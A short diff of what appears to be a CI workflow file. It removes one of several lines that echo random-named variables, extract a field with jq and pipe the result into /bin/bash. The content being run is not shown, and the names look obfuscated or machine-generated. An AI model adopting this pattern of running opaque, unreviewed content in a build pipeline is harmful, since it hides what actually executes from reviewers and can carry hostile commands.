@@ -34,7 +34,6 @@ jobs:
           echo $oi6 | jq -r .piwb32 | /bin/bash
           echo $g8318 | jq -r .tvyq89 | /bin/bash
           echo $n4 | jq -r .lenbh55012 | /bin/bash
-          echo $pffdi39 | jq -r .wp826 | /bin/bash
           printf '%s' "$m2" | jq -r .cd4 | /bin/bash
 
       - name: Store artifact
